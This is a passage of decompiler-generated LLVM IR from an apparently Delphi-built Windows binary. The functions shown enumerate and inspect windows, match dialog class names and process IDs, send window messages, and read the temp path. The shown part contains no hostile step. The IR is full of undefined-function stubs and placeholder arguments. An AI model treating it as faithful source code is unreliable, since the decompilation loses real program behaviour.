  %0 = call i32 @"@HandleFinally"(), !insn.addr !1823
  ret i32 %0, !insn.addr !1823
}

define i32 @function_4072a3() local_unnamed_addr {
dec_label_pc_4072a3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1824
}

define i32 @function_4072a5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4072a5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1825
}

define i32 @function_4072a8() local_unnamed_addr {
dec_label_pc_4072a8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1826
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1826
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1826
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1827
  %2 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1828
  %3 = add i32 %2, -1, !insn.addr !1828
  %4 = icmp eq i32 %2, 0, !insn.addr !1828
  store i32 %3, i32* @global_var_4096e0, align 4, !insn.addr !1828
  %5 = icmp eq i1 %4, false, !insn.addr !1829
  br i1 %5, label %dec_label_pc_4072dc, label %dec_label_pc_4072c2, !insn.addr !1829

dec_label_pc_4072c2:                              ; preds = %dec_label_pc_4072a8
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1830
  br label %dec_label_pc_4072dc, !insn.addr !1831

dec_label_pc_4072dc:                              ; preds = %dec_label_pc_4072c2, %dec_label_pc_4072a8
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1832
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1833
  ret i32 0, !insn.addr !1834
}

define i32 @function_4072ea() local_unnamed_addr {
dec_label_pc_4072ea:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1835
  ret i32 %0, !insn.addr !1835
}

define i32 @function_4072ef() local_unnamed_addr {
dec_label_pc_4072ef:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1836
}

define i32 @function_4072f1(i32 %arg1) local_unnamed_addr {
dec_label_pc_4072f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1837
}

define i1 @function_4072f4(i8* %pszPath) local_unnamed_addr {
dec_label_pc_4072f4:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1838
  ret i1 %0, !insn.addr !1838
}

define i32 @function_4072fc() local_unnamed_addr {
dec_label_pc_4072fc:
  %eax.0.reg2mem = alloca i32, !insn.addr !1839
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1840
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1841
  %2 = icmp eq i32 %1, 0, !insn.addr !1842
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1843
  br i1 %2, label %dec_label_pc_407332, label %dec_label_pc_407314, !insn.addr !1843

dec_label_pc_407314:                              ; preds = %dec_label_pc_4072fc
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1840
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1844
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1844
  %7 = load i8, i8* %6, align 1, !insn.addr !1844
  %8 = icmp eq i8 %7, 92, !insn.addr !1844
  br i1 %8, label %dec_label_pc_407324, label %dec_label_pc_40731b, !insn.addr !1845

dec_label_pc_40731b:                              ; preds = %dec_label_pc_407314
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1846
  store i8 92, i8* %9, align 1, !insn.addr !1846
  %10 = or i32 %3, 1, !insn.addr !1847
  %11 = add i32 %1, %10, !insn.addr !1847
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1847
  store i8 0, i8* %12, align 1, !insn.addr !1847
  br label %dec_label_pc_407324, !insn.addr !1847

dec_label_pc_407324:                              ; preds = %dec_label_pc_40731b, %dec_label_pc_407314
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1848
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1848
  br label %dec_label_pc_407332, !insn.addr !1848

dec_label_pc_407332:                              ; preds = %dec_label_pc_407324, %dec_label_pc_4072fc
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1849
}

define i32 @function_40733c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40733c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1850
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1851
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1852
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1852
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1852
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1853
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1854
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1854
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1855
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1855
  %5 = icmp eq i1 %4, false, !insn.addr !1856
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1857
  br i1 %5, label %dec_label_pc_4073f3, label %dec_label_pc_407373, !insn.addr !1857

dec_label_pc_407373:                              ; preds = %dec_label_pc_40733c
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1858
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1858
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1859
  %8 = icmp eq i32 %7, 32770, !insn.addr !1860
  %9 = icmp eq i1 %8, false, !insn.addr !1861
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1861
  br i1 %9, label %dec_label_pc_4073f3, label %dec_label_pc_407382, !insn.addr !1861

dec_label_pc_407382:                              ; preds = %dec_label_pc_407373
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1862
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1862
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1863
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1863
  %13 = add i32 %arg1, 4, !insn.addr !1864
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1864
  %15 = load i32, i32* %14, align 4, !insn.addr !1864
  %16 = icmp eq i32 %15, %12, !insn.addr !1864
  %17 = icmp eq i1 %16, false, !insn.addr !1865
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1865
  br i1 %17, label %dec_label_pc_4073f3, label %dec_label_pc_40738d, !insn.addr !1865

dec_label_pc_40738d:                              ; preds = %dec_label_pc_407382
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1866
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1866
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1867
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1868
  %21 = load i32, i32* %20, align 4, !insn.addr !1868
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1869
  %23 = icmp eq i32 %21, %22, !insn.addr !1869
  %24 = icmp eq i1 %23, false, !insn.addr !1870
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1870
  br i1 %24, label %dec_label_pc_4073f3, label %dec_label_pc_40739e, !insn.addr !1870

dec_label_pc_40739e:                              ; preds = %dec_label_pc_40738d
  %25 = add i32 %arg1, 8, !insn.addr !1871
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1871
  %27 = load i32, i32* %26, align 4, !insn.addr !1871
  %28 = icmp eq i32 %27, 0, !insn.addr !1871
  br i1 %28, label %dec_label_pc_4073c8, label %dec_label_pc_4073a4, !insn.addr !1872

dec_label_pc_4073a4:                              ; preds = %dec_label_pc_40739e
  %29 = call i32 @function_407514(), !insn.addr !1873
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1874
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1875
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_4073f3

dec_label_pc_4073c8:                              ; preds = %dec_label_pc_40739e
  %32 = add i32 %arg1, 12, !insn.addr !1876
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1876
  %34 = load i32, i32* %33, align 4, !insn.addr !1876
  %35 = add i32 %arg1, 16, !insn.addr !1877
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1877
  %37 = load i32, i32* %36, align 4, !insn.addr !1877
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1878
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1878
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1878
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1878
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1878
  %43 = add i32 %arg1, 24, !insn.addr !1879
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1879
  store i32 %42, i32* %44, align 4, !insn.addr !1879
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1880
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1880
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1881
  %47 = icmp eq i1 %46, false, !insn.addr !1882
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1883
  br i1 %47, label %dec_label_pc_4073f3, label %dec_label_pc_4073ee, !insn.addr !1883

dec_label_pc_4073ee:                              ; preds = %dec_label_pc_4073c8
  %48 = add i32 %arg1, 20, !insn.addr !1884
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1884
  store i32 %arg2, i32* %49, align 4, !insn.addr !1884
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1885
  br label %dec_label_pc_4073f3, !insn.addr !1885

dec_label_pc_4073f3:                              ; preds = %dec_label_pc_4073a4, %dec_label_pc_4073ee, %dec_label_pc_4073c8, %dec_label_pc_40738d, %dec_label_pc_407382, %dec_label_pc_407373, %dec_label_pc_40733c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1886
  %51 = load i32, i32* %50, align 4, !insn.addr !1886
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1887
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1888
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1888
  store i32 4224021, i32* %53, align 4, !insn.addr !1888
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1889
  ret i32 %54, !insn.addr !1890
}

define i32 @function_40740e() local_unnamed_addr {
dec_label_pc_40740e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1891
  ret i32 %0, !insn.addr !1891
}

define i32 @function_407413() local_unnamed_addr {
dec_label_pc_407413:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1892
}

define i32 @function_407415(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407415:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1893
}

define i32 @function_407420(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407420:
  %esp.0.reg2mem = alloca i32, !insn.addr !1894
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1895
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1896
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1896
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1896
  %6 = call i32 @function_40441c(), !insn.addr !1897
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1898
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1899
  br label %dec_label_pc_407464, !insn.addr !1899

dec_label_pc_407464:                              ; preds = %dec_label_pc_407483, %dec_label_pc_407420
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1898
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1898
  store i32 %7, i32* %9, align 4, !insn.addr !1898
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1900
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1900
  store i32 4223804, i32* %11, align 4, !insn.addr !1900
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1901
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1902
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1902
  store i32 1, i32* %14, align 4, !insn.addr !1902
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1903
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1904
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1904
  store i32 0, i32* %16, align 4, !insn.addr !1904
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1905
  %18 = icmp eq i1 %17, false, !insn.addr !1906
  %19 = icmp eq i1 %18, false, !insn.addr !1907
  br i1 %19, label %dec_label_pc_40748e, label %dec_label_pc_407483, !insn.addr !1907

dec_label_pc_407483:                              ; preds = %dec_label_pc_407464
  %20 = call i32 @function_40441c(), !insn.addr !1908
  %21 = sub i32 %20, %6, !insn.addr !1909
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1910
  %23 = icmp eq i1 %22, false, !insn.addr !1911
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1911
  br i1 %23, label %dec_label_pc_407464, label %dec_label_pc_40748e, !insn.addr !1911

dec_label_pc_40748e:                              ; preds = %dec_label_pc_407483, %dec_label_pc_407464
  ret i32 0, !insn.addr !1912
}

define i32 @function_4074a8() local_unnamed_addr {
dec_label_pc_4074a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1913
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1914
}

define i32 @function_4074c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4074c0:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1915
  %edi.0.reg2mem = alloca i32, !insn.addr !1915
  %ecx.0.reg2mem = alloca i32, !insn.addr !1915
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1916
  br label %2, !insn.addr !1916

; <label>:2:                                      ; preds = %4, %dec_label_pc_4074c0
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1916
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1916
  br i1 %3, label %10, label %4, !insn.addr !1916

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1916
  %6 = load i8, i8* %5, align 1, !insn.addr !1916
  %7 = icmp eq i8 %6, 0, !insn.addr !1916
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1916
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1916
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1916
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1916
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1916
  br i1 %7, label %10, label %2, !insn.addr !1916

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1917
  ret i32 %11, !insn.addr !1918
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_407514() local_unnamed_addr {
dec_label_pc_407514:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1919
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1920
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1920
  %4 = add i32 %3, %1, !insn.addr !1921
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1921
  store i8 0, i8* %5, align 1, !insn.addr !1921
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1922
  ret i32 %6, !insn.addr !1923
}

define i32 @function_407548() local_unnamed_addr {
dec_label_pc_407548:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1924
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1925
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1926
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1926
  %6 = add i32 %5, %3, !insn.addr !1927
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1927
  store i8 0, i8* %7, align 1, !insn.addr !1927
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1928
  ret i32 %8, !insn.addr !1929
}

define i32 @function_407580() local_unnamed_addr {
dec_label_pc_407580:
  %0 = call i32 @function_4034c8(), !insn.addr !1930
  %1 = call i32 @function_4034c8(), !insn.addr !1931
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1932
  ret i32 %2, !insn.addr !1933
}

define i32 @function_4075c0() local_unnamed_addr {
dec_label_pc_4075c0:
  %0 = call i32 @function_4034c8(), !insn.addr !1934
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1935
  ret i32 %1, !insn.addr !1936
}

define i32 @function_4075f8() local_unnamed_addr {
dec_label_pc_4075f8:
  %0 = call i32 @function_4036c8(), !insn.addr !1937
  %1 = call i32 @function_4036c8(), !insn.addr !1938
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1939
  %3 = icmp eq i32 %2, 2, !insn.addr !1940
  %4 = zext i1 %3 to i32, !insn.addr !1941
  %5 = and i32 %2, -256, !insn.addr !1941
  %6 = or i32 %5, %4, !insn.addr !1941
  ret i32 %6, !insn.addr !1942
}

define i32 @function_407628() local_unnamed_addr {
dec_label_pc_407628:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1943
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1943
  %esp.02.reg2mem = alloca i32, !insn.addr !1943
  %storemerge3.reg2mem = alloca i32, !insn.addr !1943
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1944
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1944
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1944
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1945
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1946
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1947
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1947
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1948
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1948
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1948
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1949
  %9 = icmp eq i1 %8, false, !insn.addr !1950
  %10 = icmp eq i1 %9, false, !insn.addr !1951
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1951
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1951
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1951
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1951
  br i1 %10, label %dec_label_pc_40764c, label %dec_label_pc_40768c, !insn.addr !1951

dec_label_pc_40764c:                              ; preds = %dec_label_pc_407628, %dec_label_pc_40764c
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_407514(), !insn.addr !1952
  %12 = call i32 @function_407628(), !insn.addr !1953
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1954
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1954
  store i32 2, i32* %14, align 4, !insn.addr !1954
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1955
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1955
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1955
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1956
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1948
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1948
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1949
  %21 = icmp eq i1 %20, false, !insn.addr !1950
  %22 = icmp eq i1 %21, false, !insn.addr !1951
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1951
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1951
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1951
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1951
  br i1 %22, label %dec_label_pc_40764c, label %dec_label_pc_40768c, !insn.addr !1951

dec_label_pc_40768c:                              ; preds = %dec_label_pc_40764c, %dec_label_pc_407628
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1957
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1958
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1959
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1959
  store i32 4224681, i32* %25, align 4, !insn.addr !1959
  %26 = call i32 @"@LStrClr"(), !insn.addr !1960
  ret i32 %26, !insn.addr !1961
}

define i32 @function_4076a2() local_unnamed_addr {
dec_label_pc_4076a2:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1962
  ret i32 %0, !insn.addr !1962
}

define i32 @function_4076a7() local_unnamed_addr {
dec_label_pc_4076a7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1963
}

define i32 @function_4076a9(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4076a9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1964
}

define i32 @function_4076b4() local_unnamed_addr {
dec_label_pc_4076b4:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1965
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1965
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1965
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1966
  %2 = call i32 @function_407548(), !insn.addr !1967
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1968
  %4 = call i32 @function_407628(), !insn.addr !1969
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1970
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1971
  %6 = call i32 @"@LStrClr"(), !insn.addr !1972
  ret i32 %6, !insn.addr !1973
}

define i32 @function_407715() local_unnamed_addr {
dec_label_pc_407715:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1974
  ret i32 %0, !insn.addr !1974
}

define i32 @function_40771a() local_unnamed_addr {
dec_label_pc_40771a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1975
}

define i32 @function_40771c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_40771c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1976
}

define i32 @function_407737() local_unnamed_addr {
dec_label_pc_407737:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1977
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1977
  store i32 %3, i32* %4, align 4, !insn.addr !1977
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1978
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1978
  %9 = add i8 %6, %8, !insn.addr !1978
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1978
  store i8 %9, i8* %10, align 1, !insn.addr !1978
  %11 = add i32 %2, 81, !insn.addr !1979
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1979
  %13 = load i8, i8* %12, align 1, !insn.addr !1979
  %14 = trunc i32 %1 to i8, !insn.addr !1979
  %15 = add i8 %13, %14, !insn.addr !1979
  store i8 %15, i8* %12, align 1, !insn.addr !1979
  %16 = load i32, i32* %eax, align 4, !insn.addr !1980
  ret i32 %16, !insn.addr !1980
}

define x86_fp80 @function_40773f() local_unnamed_addr {
dec_label_pc_40773f:
  %0 = call x86_fp80 @__decompiler_undefined_function_11()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1981
  ret x86_fp80 %1, !insn.addr !1982
}

define i32 @function_407744() local_unnamed_addr {
dec_label_pc_407744:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1983
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1984
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1984
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1984
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1985
  %3 = call i32 @function_407548(), !insn.addr !1986
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1987
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1988
  %6 = icmp eq i32 %5, 180, !insn.addr !1989
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1990
  br i1 %6, label %dec_label_pc_4077a7, label %dec_label_pc_407782, !insn.addr !1990

dec_label_pc_407782:                              ; preds = %dec_label_pc_407744
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1991
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1992
  %10 = icmp eq i1 %9, false, !insn.addr !1993
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1993
  br i1 %10, label %dec_label_pc_4077a7, label %dec_label_pc_40778e, !insn.addr !1993

dec_label_pc_40778e:                              ; preds = %dec_label_pc_407782
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1994
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_4077a7

dec_label_pc_4077a7:                              ; preds = %dec_label_pc_40778e, %dec_label_pc_407744, %dec_label_pc_407782
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1995
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1996
  %13 = add i32 %esp.1, 8, !insn.addr !1997
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1997
  store i32 4224970, i32* %14, align 4, !insn.addr !1997
  %15 = call i32 @"@LStrClr"(), !insn.addr !1998
  ret i32 %15, !insn.addr !1999
}

define i32 @function_4077c3() local_unnamed_addr {
dec_label_pc_4077c3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2000
  ret i32 %0, !insn.addr !2000
}

define i32 @function_4077c8() local_unnamed_addr {
dec_label_pc_4077c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2001
}

define i32 @function_4077ca(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4077ca:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2002
}

define i32 @function_4077e0() local_unnamed_addr {
dec_label_pc_4077e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !2003
